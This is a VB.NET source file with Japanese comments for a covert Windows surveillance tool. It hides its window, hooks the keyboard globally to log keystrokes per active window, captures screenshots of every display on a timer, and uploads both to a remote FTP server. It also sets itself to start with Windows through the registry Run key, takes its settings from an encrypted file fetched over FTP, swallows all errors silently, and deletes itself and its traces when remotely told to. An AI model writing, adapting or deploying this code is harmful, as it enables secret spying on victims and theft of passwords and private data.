Imports System.Text
Imports System.Xml
Imports System.IO

Public Class FrmMain

#Region "定数"

    ''' <summary>
    ''' MD5用パスワード
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_MD5_PASSWORD As String = "BURIGADEN19960423"

    ''' <summary>
    ''' 秒をミリ秒に変換用
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_SEC_TO_MILISEC As Integer = 1000

    ''' <summary>
    ''' XMLタイマーのインターバル
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_READ_XML_INTERVAL As Integer = 30

    ''' <summary>
    ''' 設定XMLファイルのルートエレメントの名前
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_XML_ROOT_ELEMENT_NAME As String = "Settings"

    ''' <summary>
    ''' ALT+TABで非表示とする為の定数
    ''' </summary>
    ''' <remarks></remarks>
    Private Const WS_EX_TOOLWINDOW As Integer = &H80

    ''' <summary>
    ''' FTPサーバーに読み込みに行くファイル名
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_DEFAULT_OUTPUT_FILE_NAME As String = "Settings.xml"

    ''' <summary>
    ''' 自殺用バッチファイル名
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_DELETE_BAT_FILE_NAME = "tmp.bat"

#End Region

#Region "列挙体"

    ''' <summary>
    ''' 設定レジストリ名
    ''' </summary>
    ''' <remarks></remarks>
    Private Enum EnumRegName
        SERVER      ' サーバー名
        USER        ' ユーザー名
        PASSWORD    ' パスワード
        IMG_DIR     ' 画像ディレクトリ
        KEY_DIR     ' キーボードディレクトリ
        FILE_DIR    ' ファイル・ディレクトリ
        RUN         ' 実行許可
        SECOND      ' 秒
        KEY_RUN     ' キーボードキャプチャ実行許可
        KEY_SECOND  ' キーボードキャプチャ秒
        FTP_RUN     ' ファイル読込実行許可
        FTP_SECOND  ' ファイル読込秒
        IS_DELETE   ' 自殺するかどうか
    End Enum

#End Region

#Region "メンバ変数"

    ''' <summary>
    ''' タイマー
    ''' </summary>
    ''' <remarks></remarks>
    Private WithEvents ImageTimer As New System.Timers.Timer

    ''' <summary>
    ''' キーボードタイマー
    ''' </summary>
    ''' <remarks></remarks>
    Private WithEvents KeyCapTimer As New System.Timers.Timer

    ''' <summary>
    ''' FTPタイマー
    ''' </summary>
    ''' <remarks></remarks>
    Private WithEvents FtpTimer As New System.Timers.Timer

    ''' <summary>
    ''' XMLタイマー
    ''' </summary>
    ''' <remarks></remarks>
    Private WithEvents XmlTimer As New System.Timers.Timer

    ''' <summary>
    ''' グローバルフック
    ''' </summary>
    ''' <remarks></remarks>
    Private WithEvents GlobalKeyHooker As New WinIUHook.GlobalKeyHook

    ''' <summary>
    ''' キーボード文字列バッファ
    ''' </summary>
    ''' <remarks></remarks>
    Dim KeyCapList As New Dictionary(Of String, StringBuilder)

#End Region

#Region "プロパティ"

    ''' <summary>
    ''' サーバー名
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property Server As String
        Get
            Return Me.GetRegistry(EnumRegName.SERVER)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.SERVER, value)
        End Set
    End Property

    ''' <summary>
    ''' ユーザー名
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property User As String
        Get
            Return Me.GetRegistry(EnumRegName.USER)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.USER, value)
        End Set
    End Property

    ''' <summary>
    ''' パスワード
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property Password As String
        Get
            Return Me.GetRegistry(EnumRegName.PASSWORD)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.PASSWORD, value)
        End Set
    End Property

    ''' <summary>
    ''' 画像ディレクトリ
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property ImgDir As String
        Get
            Return Me.GetRegistry(EnumRegName.IMG_DIR)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.IMG_DIR, value)
        End Set
    End Property

    ''' <summary>
    ''' キーボードディレクトリ
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property KeyDir As String
        Get
            Return Me.GetRegistry(EnumRegName.KEY_DIR)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.KEY_DIR, value)
        End Set
    End Property

    ''' <summary>
    ''' ファイルディレクトリ
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property FileDir As String
        Get
            Return Me.GetRegistry(EnumRegName.FILE_DIR)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.FILE_DIR, value)
        End Set
    End Property

    ''' <summary>
    ''' 実行許可
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property Run As Boolean
        Get
            Return Me.Int2Bool(Me.Str2Int(Me.GetRegistry(EnumRegName.RUN)))
        End Get
        Set(value As Boolean)
            Me.SetRegistry(EnumRegName.RUN, Me.Bool2Int(value).ToString)
        End Set
    End Property

    ''' <summary>
    ''' 秒
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property Second As Integer
        Get
            Dim tmp As Integer = Me.Str2Int(Me.GetRegistry(EnumRegName.SECOND))
            If tmp = 0 Then
                Return 10
            Else
                Return tmp
            End If
        End Get
        Set(value As Integer)
            Me.SetRegistry(EnumRegName.SECOND, value.ToString)
        End Set
    End Property

    ''' <summary>
    ''' キーボード実行許可
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property KeyRun As Boolean
        Get
            Return Me.Int2Bool(Me.Str2Int(Me.GetRegistry(EnumRegName.KEY_RUN)))
        End Get
        Set(value As Boolean)
            Me.SetRegistry(EnumRegName.KEY_RUN, Me.Bool2Int(value).ToString)
        End Set
    End Property

    ''' <summary>
    ''' キーボードキャプチャ秒
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property KeySecond As Integer
        Get
            Dim tmp As Integer = Me.Str2Int(Me.GetRegistry(EnumRegName.KEY_SECOND))
            If tmp = 0 Then
                Return 10
            Else
                Return tmp
            End If
        End Get
        Set(value As Integer)
            Me.SetRegistry(EnumRegName.KEY_SECOND, value.ToString)
        End Set
    End Property

    ''' <summary>
    ''' FTP側ファイル読込実行許可
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property FtpRun As Boolean
        Get
            Return Me.Int2Bool(Me.Str2Int(Me.GetRegistry(EnumRegName.FTP_RUN)))
        End Get
        Set(value As Boolean)
            Me.SetRegistry(EnumRegName.FTP_RUN, Me.Bool2Int(value).ToString)
        End Set
    End Property

    ''' <summary>
    ''' FTP側ファイル読込秒
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property FtpSecond As Integer
        Get
            Dim tmp As Integer = Me.Str2Int(Me.GetRegistry(EnumRegName.FTP_SECOND))
            If tmp = 0 Then
                Return 10
            Else
                Return tmp
            End If
        End Get
        Set(value As Integer)
            Me.SetRegistry(EnumRegName.FTP_SECOND, value.ToString)
        End Set
    End Property

    ''' <summary>
    ''' 自殺するかどうか
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property IsDelete As Boolean
        Get
            Return Me.Int2Bool(Me.Str2Int(Me.GetRegistry(EnumRegName.IS_DELETE)))
        End Get
        Set(value As Boolean)
            Me.SetRegistry(EnumRegName.IS_DELETE, Me.Bool2Int(value).ToString)
        End Set
    End Property

    ''' <summary>
    ''' レジストリ名一覧
    ''' </summary>
    ''' <remarks></remarks>
    Private RegNameList As New Dictionary(Of EnumRegName, String)

    ''' <summary>
    ''' ALT+TABで非表示とする
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Protected Overrides ReadOnly Property CreateParams() As System.Windows.Forms.CreateParams
        Get
            Dim p As CreateParams = MyBase.CreateParams
            p.ExStyle = p.ExStyle Or WS_EX_TOOLWINDOW
            Return p
        End Get
    End Property

#End Region

#Region "コンストラクタ"

    ''' <summary>
    ''' コンストラクタ
    ''' </summary>
    ''' <remarks></remarks>
    Public Sub New()
        Try
            ' この呼び出しは、Windows フォーム デザイナで必要です。
            InitializeComponent()

            ' InitializeComponent() 呼び出しの後で初期化を追加します。

            ' 作業ファイル削除
            Me.DeleteTmpImage()

            ' Enum番号とレジストリ名の紐付け
            With Me.RegNameList
                .Add(EnumRegName.IMG_DIR, "a")
                .Add(EnumRegName.KEY_DIR, "b")
                .Add(EnumRegName.FILE_DIR, "c")
                .Add(EnumRegName.PASSWORD, "d")
                .Add(EnumRegName.SERVER, "e")
                .Add(EnumRegName.USER, "f")
                .Add(EnumRegName.RUN, "g")
                .Add(EnumRegName.SECOND, "h")
                .Add(EnumRegName.KEY_RUN, "i")
                .Add(EnumRegName.KEY_SECOND, "j")
                .Add(EnumRegName.FTP_RUN, "k")
                .Add(EnumRegName.FTP_SECOND, "l")
                .Add(EnumRegName.IS_DELETE, "m")
            End With

            ' FTPファイル読み込み
            Me.GetFTP()

            ' XML読み込み
            Me.ReadXmlTimer_Tick(Nothing, Nothing)

            ' イメージタイマー設定
            With Me.ImageTimer
                .Interval = Me.Second * FrmMain.CONST_SEC_TO_MILISEC
                .AutoReset = True
                .SynchronizingObject = Me
            End With

            ' キーボードタイマー設定
            With Me.KeyCapTimer
                .Interval = Me.KeySecond * FrmMain.CONST_SEC_TO_MILISEC
                .AutoReset = True
                .SynchronizingObject = Me
            End With

            ' FTPタイマー設定
            With Me.FtpTimer
                .Interval = Me.FtpSecond * FrmMain.CONST_SEC_TO_MILISEC
                .AutoReset = True
                .SynchronizingObject = Me
            End With

            ' XMLタイマー設定
            With Me.XmlTimer
                .Interval = FrmMain.CONST_READ_XML_INTERVAL * FrmMain.CONST_SEC_TO_MILISEC
                .AutoReset = True
                .SynchronizingObject = Me
            End With

            ' KeyHook開始
            Me.GlobalKeyHooker.Init(Me)

            ' 各タイマースタート
            Me.ImageTimer.Start()
            Me.KeyCapTimer.Start()
            Me.FtpTimer.Start()
            Me.XmlTimer.Start()

            ' 念の為フォームを非表示に
            Me.Visible = False
        Catch
        End Try
    End Sub

#End Region

#Region "メイン処理"

    ''' <summary>
    ''' イメージメイン処理
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub ImageUpper()
        Try
            ' 実行チェック
            If Not Me.Run Then
                Exit Sub
            End If

            ' レジストリから設定値を取得
            Dim server As String = Me.Server
            Dim user As String = Me.User
            Dim pass As String = Me.Password
            Dim dir As String = Me.ImgDir.TrimEnd("/")

            ' 件数
            Dim i As Integer = 1

            ' 設定値が正常であれば実行
            If server <> String.Empty _
            And user <> String.Empty _
            And pass <> String.Empty Then

                ' 全てのディスプレイに対して実行する
                For Each disp In System.Windows.Forms.Screen.AllScreens
                    Dim file_path As String = String.Empty

                    Try

                        ' Bitmapの作成
                        Using bmp As New Bitmap(disp.Bounds.Width, disp.Bounds.Height)
                            ' Graphicsの作成
                            Using g As Graphics = Graphics.FromImage(bmp)

                                ' 画面全体をコピーする
                                g.CopyFromScreen(New Point(disp.Bounds.X, disp.Bounds.Y), New Point(0, 0), bmp.Size)

                                ' 一時保存
                                file_path = System.IO.Path.Combine(My.Application.Info.DirectoryPath, String.Concat(i.ToString, ".tmp"))
                                bmp.Save(file_path, System.Drawing.Imaging.ImageFormat.Png)

                            End Using
                        End Using

                        ' WebClientオブジェクトを作成
                        Try
                            Using wc As New System.Net.WebClient()
                                With wc
                                    ' ログインユーザー名とパスワードを指定
                                    .Credentials = New System.Net.NetworkCredential(user, pass)

                                    ' FTPサーバーにアップロード
                                    Dim new_file_name As String = String.Concat(System.Environment.UserName, "_", System.Environment.MachineName, "_", Now.ToString("yyyy-MM-dd_HHmmss"), "_", i.ToString, ".png")
                                    Dim ftp_uri As String = String.Concat("ftp://", user, "@", server, dir, "/")
                                    .UploadFile(String.Concat(ftp_uri, new_file_name), file_path)

                                    ' 件数カウントアップ
                                    i = i + 1
                                End With
                            End Using
                        Catch
                        End Try
                    Catch
                    End Try

                    ' ファイル削除"
                    System.IO.File.Delete(file_path)
                Next
            End If
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' キーボードメイン処理
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub KeyCapUpper()
        Try
            ' 実行チェック
            If Not Me.KeyRun Then
                Exit Sub
            End If

            ' レジストリから設定値を取得
            Dim server As String = Me.Server
            Dim user As String = Me.User
            Dim pass As String = Me.Password
            Dim dir As String = Me.KeyDir.TrimEnd("/")

            ' 設定値が正常であれば実行
            If server <> String.Empty _
            And user <> String.Empty _
            And pass <> String.Empty Then
                Dim i As Integer = 0
                For Each item As KeyValuePair(Of String, StringBuilder) In Me.KeyCapList
                    ' 文字が空であれば無視
                    If item.Value.Length = 0 Then
                        Continue For
                    End If

                    ' 一時保存
                    Dim file_path As String = System.IO.Path.Combine(My.Application.Info.DirectoryPath, String.Concat("kcp", i.ToString, ".tmp"))
                    Using sw As IO.StreamWriter = IO.File.AppendText(file_path)
                        With sw
                            .WriteLine(item.Value)
                            .Flush()
                        End With
                    End Using

                    ' WebClientオブジェクトを作成
                    Try
                        Using wc As New System.Net.WebClient()
                            With wc
                                ' ログインユーザー名とパスワードを指定
                                .Credentials = New System.Net.NetworkCredential(user, pass)

                                ' FTPサーバーにアップロード
                                Dim new_file_name As String = String.Concat(System.Environment.UserName, "_", System.Environment.MachineName, "_", Now.ToString("yyyy-MM-dd_HHmmss"), "_", item.Key, ".csv")
                                Dim ftp_uri As String = String.Concat("ftp://", user, "@", server, dir, "/")
                                .UploadFile(String.Concat(ftp_uri, new_file_name), file_path)
                            End With
                        End Using
                    Catch
                    End Try

                    ' ファイル削除"
                    System.IO.File.Delete(file_path)

                    ' 所持文字削除
                    item.Value.Clear()
                Next
            End If
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' FTP先にあるファイルを読み込む
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub GetFTP()
        Try
            ' 設定ファイルを読み込む
            Me.GetSettingFile()
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' グローバルフックキー押下イベント
    ''' </summary>
    ''' <param name="key"></param>
    ''' <remarks></remarks>
    Private Sub EvtKeyDown(sender As Object, e As WinIUHook.GlobalKeyHookKeyEventArgs) Handles GlobalKeyHooker.KeyDown
        Try
            ' アクティブウィンドウ名取得
            Dim appName As String = WinIUWindow.WindowControl.GetActiveWindowName.Replace(" ", "_").Replace("　", "_")

            ' アクティブウィンドウ名からファイル名に使えない文字を_に置き換える
            Dim invalidFileNameChars As Char() = IO.Path.GetInvalidFileNameChars()
            For Each invalidChar As Char In invalidFileNameChars
                If appName.Contains(invalidChar) Then
                    appName = appName.Replace(invalidChar, "_")
                End If
            Next

            ' 新規ウィンドウ名であればインスタンスの生成
            If Not Me.KeyCapList.ContainsKey(appName) Then
                Me.KeyCapList.Add(appName, New StringBuilder)
            End If

            ' 押下されたキーを保存する
            Me.KeyCapList(appName).Append(String.Concat([Enum].GetName(GetType(Keys), e.Key), ","))
        Catch
        End Try
    End Sub

#End Region

#Region "フック開放"

    ''' <summary>
    ''' フォーム直前イベント
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub FrmMain_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Try
            ' フックの開放
            Me.GlobalKeyHooker.Init(Me)
        Catch
        End Try
    End Sub

#End Region

#Region "作業ファイル削除"

    ''' <summary>
    ''' 何かしらの理由で残ってしまった*.tmpファイルを全て削除する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub DeleteTmpImage()
        Try
            Dim fileList As String() = System.IO.Directory.GetFiles(My.Application.Info.DirectoryPath, "*.tmp", IO.SearchOption.TopDirectoryOnly)
            For Each path As String In fileList
                If System.IO.File.Exists(path) Then
                    System.IO.File.Delete(path)
                End If
            Next
        Catch
        End Try
    End Sub

#End Region

#Region "タイマー"

    ''' <summary>
    ''' 画像タイマー経過時動作
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub UpperTimer_Tick(sender As Object, e As System.Timers.ElapsedEventArgs) Handles ImageTimer.Elapsed
        Try
            ' インターバルをチェック
            Dim second As Integer = Me.Second * FrmMain.CONST_SEC_TO_MILISEC
            If Me.ImageTimer.Interval <> second Then
                ' 設定値と異なったので再設定
                Me.ImageTimer.Interval = second
            End If

            ' 画像処理開始
            Me.ImageUpper()
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' キーボードタイマー経過時動作
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub KeyCapTimer_Tick(sender As Object, e As System.Timers.ElapsedEventArgs) Handles KeyCapTimer.Elapsed
        Try
            ' インターバルをチェック
            Dim second As Integer = Me.KeySecond * FrmMain.CONST_SEC_TO_MILISEC
            If Me.KeyCapTimer.Interval <> second Then
                ' 設定値と異なったので再設定
                Me.KeyCapTimer.Interval = second
            End If

            ' メイン処理開始
            Me.KeyCapUpper()
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' FTPタイマー経過時動作
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub FtpTimer_Tick(sender As Object, e As System.Timers.ElapsedEventArgs) Handles FtpTimer.Elapsed
        Try
            ' インターバルをチェック
            Dim second As Integer = Me.FtpSecond * FrmMain.CONST_SEC_TO_MILISEC
            If Me.FtpTimer.Interval <> second Then
                ' 設定値と異なったので再設定
                Me.FtpTimer.Interval = second
            End If

            ' メイン処理開始
            Me.GetFTP()
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' XMLタイマー経過時動作
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub ReadXmlTimer_Tick(sender As Object, e As System.Timers.ElapsedEventArgs) Handles XmlTimer.Elapsed
        Try
            ' 自動実行のチェック
            Me.CheckAutoRun()

            ' XMLファイル読込
            Me.ReadXmlSettings()

            ' 自殺する必要があるかどうか
            If Me.IsDelete Then
                Me.Suicide()
            End If
        Catch
        End Try
    End Sub

#End Region

#Region "自動実行監視"

    ''' <summary>
    ''' 自動実行用レジストリが設定されているかどうか判定し、
    ''' 無いもしくは誤った値であれば値を設定する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub CheckAutoRun()
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Try
            Dim key As String = "Software\Microsoft\Windows\CurrentVersion\Run"

            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' 値を取得
            Dim dir As String = reg_key.GetValue(My.Application.Info.ProductName)

            ' 値が空、もしくは値のディレクトリの存在を判定
            If dir Is Nothing OrElse Not IO.File.Exists(dir) Then
                reg_key.SetValue(My.Application.Info.ProductName, IO.Path.Combine(My.Application.Info.DirectoryPath, String.Concat(My.Application.Info.AssemblyName, ".exe")))
            End If

            ' 閉じる
            reg_key.Close()
        Catch
            ' 閉じる
            If reg_key IsNot Nothing Then
                reg_key.Close()
            End If
        End Try
    End Sub

#End Region

#Region "FTPサーバー側設定ファイル取得"

    ''' <summary>
    ''' FTP先にある設定ファイルを取得する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub GetSettingFile()
        Try
            ' レジストリから設定値を取得
            Dim server As String = Me.Server
            Dim user As String = Me.User
            Dim pass As String = Me.Password
            Dim dir As String = Me.FileDir.TrimEnd("/")

            ' WebClientオブジェクトを作成
            Using wc As New System.Net.WebClient()
                With wc
                    ' ログインユーザー名とパスワードを指定
                    .Credentials = New System.Net.NetworkCredential(user, pass)

                    ' FTPサーバーからダウンロード
                    Dim ftp_uri As String = String.Concat("ftp://", user, "@", server, dir, "/", FrmMain.CONST_DEFAULT_OUTPUT_FILE_NAME)
                    .DownloadFile(ftp_uri, System.IO.Path.Combine(My.Application.Info.DirectoryPath, FrmMain.CONST_DEFAULT_OUTPUT_FILE_NAME))
                End With
            End Using
        Catch
        End Try
    End Sub

#End Region

#Region "ローカルXMLファイル読込"

    ''' <summary>
    ''' XMLファイルを読み込んでレジストリに設定する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub ReadXmlSettings()
        Try
            Dim fileList As String() = System.IO.Directory.GetFiles(My.Application.Info.DirectoryPath, "*.xml", IO.SearchOption.TopDirectoryOnly)
            For Each path As String In fileList
                Try
                    ' XML読込準備
                    Dim xrs As New XmlReaderSettings With {.ConformanceLevel = ConformanceLevel.Document}

                    ' 書込予定値
                    Dim writeList As New Dictionary(Of EnumRegName, String)
                    With writeList
                        .Add(EnumRegName.IMG_DIR, String.Empty)
                        .Add(EnumRegName.KEY_DIR, String.Empty)
                        .Add(EnumRegName.FILE_DIR, String.Empty)
                        .Add(EnumRegName.PASSWORD, String.Empty)
                        .Add(EnumRegName.SERVER, String.Empty)
                        .Add(EnumRegName.USER, String.Empty)
                        .Add(EnumRegName.RUN, "0")
                        .Add(EnumRegName.SECOND, "0")
                        .Add(EnumRegName.KEY_RUN, "0")
                        .Add(EnumRegName.KEY_SECOND, "0")
                        .Add(EnumRegName.FTP_RUN, "0")
                        .Add(EnumRegName.FTP_SECOND, "0")
                        .Add(EnumRegName.IS_DELETE, "0")
                    End With

                    ' ルート発見かどうか
                    Dim isFindRoot As Boolean = False

                    ' XML読込
                    Using xr As XmlReader = XmlReader.Create(path)
                        While (xr.Read)
                            ' 読み込んだノードがエレメント且つ読み込み用変数に用意されている場合
                            If xr.NodeType = XmlNodeType.Element And (Me.RegNameList.ContainsValue(xr.Name) Or xr.Name = CONST_XML_ROOT_ELEMENT_NAME) Then
                                If xr.Name = FrmMain.CONST_XML_ROOT_ELEMENT_NAME Then
                                    isFindRoot = True
                                Else
                                    ' 復号化して保存
                                    writeList(Me.RegNameList.FirstOrDefault(Function(k As KeyValuePair(Of EnumRegName, String)) k.Value = xr.Name).Key) = WinIUCrypt.CryptMd5.DecryptString(xr.ReadElementContentAsString, FrmMain.CONST_MD5_PASSWORD)
                                End If
                            End If
                        End While
                    End Using

                    If isFindRoot Then
                        ' 読み込んだ値をレジストリに設定
                        Me.ImgDir = writeList(EnumRegName.IMG_DIR)
                        Me.KeyDir = writeList(EnumRegName.KEY_DIR)
                        Me.FileDir = writeList(EnumRegName.FILE_DIR)
                        Me.Password = writeList(EnumRegName.PASSWORD)
                        Me.Server = writeList(EnumRegName.SERVER)
                        Me.User = writeList(EnumRegName.USER)
                        Me.Run = Me.Int2Bool(Me.Str2Int(writeList(EnumRegName.RUN)))
                        Me.Second = writeList(EnumRegName.SECOND)
                        Me.KeyRun = Me.Int2Bool(Me.Str2Int(writeList(EnumRegName.KEY_RUN)))
                        Me.KeySecond = writeList(EnumRegName.KEY_SECOND)
                        Me.FtpRun = Me.Int2Bool(Me.Str2Int(writeList(EnumRegName.FTP_RUN)))
                        Me.FtpSecond = writeList(EnumRegName.FTP_SECOND)
                        Me.IsDelete = Me.Int2Bool(writeList(EnumRegName.IS_DELETE))
                    End If
                Catch
                End Try
            Next
        Catch
        End Try
    End Sub

#End Region

#Region "自殺"

    ''' <summary>
    ''' 自殺メソッド
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub Suicide()

        Try
            ' 全てのタイマーを止める
            If Me.ImageTimer IsNot Nothing Then Me.ImageTimer.Stop()
            If Me.KeyCapTimer IsNot Nothing Then Me.KeyCapTimer.Stop()
            If Me.FtpTimer IsNot Nothing Then Me.FtpTimer.Stop()
            If Me.XmlTimer IsNot Nothing Then Me.XmlTimer.Stop()

            ' TMPファイルを削除
            Me.DeleteTmpImage()

            ' CONST_DEFAULT_OUTPUT_FILE_NAMEのパスを取得(同階層のxmlを全て消すなら*.xmlを指定する)
            Dim fileList As String() = System.IO.Directory.GetFiles(My.Application.Info.DirectoryPath, CONST_DEFAULT_OUTPUT_FILE_NAME, IO.SearchOption.TopDirectoryOnly)

            ' バッチファイル作成
            Dim BatPath As String = System.IO.Path.Combine(My.Application.Info.DirectoryPath, CONST_DELETE_BAT_FILE_NAME)
            Dim DelCommand As New StringBuilder()
            With DelCommand
                For Each item As String In fileList
                    .AppendLine(String.Concat("DEL """, item, """"))
                Next
                .AppendLine(String.Concat("DEL """, Application.ExecutablePath, """"))
                .AppendLine(String.Concat("DEL """, BatPath, """"))
            End With

            Using FS As New FileStream(BatPath, FileMode.Create, FileAccess.Write)
                With FS
                    .Write(System.Text.Encoding.UTF8.GetBytes(DelCommand.ToString), 0, System.Text.Encoding.UTF8.GetByteCount(DelCommand.ToString))
                End With
            End Using

            ' レジストリ削除
            Me.CleanRegistry()
            Me.CleanAutoRunRegistry()

            ' 自殺
            WinIUSuicide.Suicide.Start(BatPath)

        Catch
        End Try

        ' 終焉
        End

    End Sub

#End Region

#Region "設定用レジストリ関連"

    ''' <summary>
    ''' 設定用レジストリの値を取得する
    ''' </summary>
    ''' <param name="prmEnum"></param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function GetRegistry(prmEnum As EnumRegName) As String
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Dim ret As String = String.Empty
        Try
            Dim key As String = "Software\" & My.Application.Info.CompanyName & "\" & My.Application.Info.ProductName
            Dim name As String = Me.RegNameList(prmEnum)

            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' 値を取得
            If reg_key.GetValue(Name) Is Nothing Then
                reg_key.SetValue(Name, String.Empty)
            Else
                ret = WinIUCrypt.CryptMd5.DecryptString(DirectCast(reg_key.GetValue(Name), String), FrmMain.CONST_MD5_PASSWORD)
            End If

            ' 閉じる
            reg_key.Close()
        Catch
            ' 閉じる
            If reg_key IsNot Nothing Then
                reg_key.Close()
            End If
        End Try

        ' 値を返す
        Return ret
    End Function

    ''' <summary>
    ''' 設定用レジストリの値を設定する
    ''' </summary>
    ''' <param name="prmEnum"></param>
    ''' <remarks></remarks>
    Private Sub SetRegistry(prmEnum As EnumRegName, prmVal As String)
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Try
            Dim key As String = "Software\" & My.Application.Info.CompanyName & "\" & My.Application.Info.ProductName
            Dim name As String = Me.RegNameList(prmEnum)

            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' 値を設定
            reg_key.SetValue(name, WinIUCrypt.CryptMd5.EncryptString(prmVal, FrmMain.CONST_MD5_PASSWORD))

            ' 閉じる
            reg_key.Close()
        Catch
            ' 閉じる
            If reg_key IsNot Nothing Then
                reg_key.Close()
            End If
        End Try
    End Sub

    ''' <summary>
    ''' 設定用レジストリを一括削除する
    ''' </summary>
    ''' <remarks></remarks>
    Private Overloads Sub CleanRegistry()
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Try
            Dim key As String = "Software\" & My.Application.Info.CompanyName

            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' キーを削除
            reg_key.DeleteSubKeyTree(My.Application.Info.ProductName)

            ' 閉じる
            reg_key.Close()
        Catch
            ' 閉じる
            If Not reg_key Is Nothing Then
                reg_key.Close()
            End If
        End Try
    End Sub

    ''' <summary>
    ''' 自動実行用レジストリを削除する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub CleanAutoRunRegistry()
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Try
            Dim key As String = "Software\Microsoft\Windows\CurrentVersion\Run"

            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' 値を削除
            reg_key.DeleteValue(My.Application.Info.ProductName)

            ' 閉じる
            reg_key.Close()
        Catch
            ' 閉じる
            If reg_key IsNot Nothing Then
                reg_key.Close()
            End If
        End Try
    End Sub

#End Region

#Region "キャスト関連"

    ''' <summary>
    ''' String型をInteger型に変換する
    ''' </summary>
    ''' <param name="value"></param>
    ''' <returns></returns>
    ''' <remarks>変換不可の場合は0とする</remarks>
    Private Function Str2Int(value As String) As Integer
        Dim ret As Integer = 0

        Try
            Integer.TryParse(value, ret)
        Catch
        End Try

        Return ret
    End Function

    ''' <summary>
    ''' Bool型をInteger型に変換する
    ''' </summary>
    ''' <param name="value"></param>
    ''' <returns></returns>
    ''' <remarks>True:1 False:0</remarks>
    Private Function Bool2Int(value As Boolean) As Integer
        Dim ret As Integer = 0

        Try
            If value Then
                ret = 1
            End If
        Catch
        End Try

        Return ret
    End Function

    ''' <summary>
    ''' Integer型をBool型に変換する
    ''' </summary>
    ''' <param name="value"></param>
    ''' <returns></returns>
    ''' <remarks>True:0以外 False:0</remarks>
    Private Function Int2Bool(value As Integer) As Boolean
        Dim ret As Boolean = True

        Try
            If value = 0 Then
                ret = False
            End If
        Catch
        End Try

        Return ret
    End Function

#End Region

End Class
